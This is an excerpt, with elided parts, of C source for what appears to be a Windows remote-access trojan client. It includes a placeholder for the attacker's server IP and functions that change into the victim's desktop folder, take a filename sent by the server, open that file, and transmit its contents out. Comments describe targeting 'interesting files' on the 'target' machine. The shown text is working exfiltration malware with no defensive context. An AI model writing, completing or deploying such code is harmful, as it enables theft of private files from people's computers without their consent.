...
#define SERVERADDRESS "SERVERIP"  // CHANGE THIS TO YOUR IP
...
int downloadfile()
{
    SetCurrentDirectory((LPCSTR)desktoppath);
...
int uploadfile()
{
    SetCurrentDirectory((LPCSTR)desktoppath);  // cd to target's desktop as there is a higher chance of interesting files
                                               // being here so we can download them

    char buf[BUFSIZE];
    int received = recv(client, buf, BUFSIZE, 0);

    buf[received] = '\0';

    HANDLE filehandle = CreateFile((LPCSTR)buf, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);  // creates a file handle to the file specified by server
                                                                                               // read only so it can be sent to the server but not modified on target machine

    if(filehandle == INVALID_HANDLE_VALUE)
    {
        return 0;  // this stops the client from hanging if an invalid filename was sent by server
    }

    TransmitFile(client, filehandle, 0, 0, NULL, NULL, 0);  // sends the file contents to the server
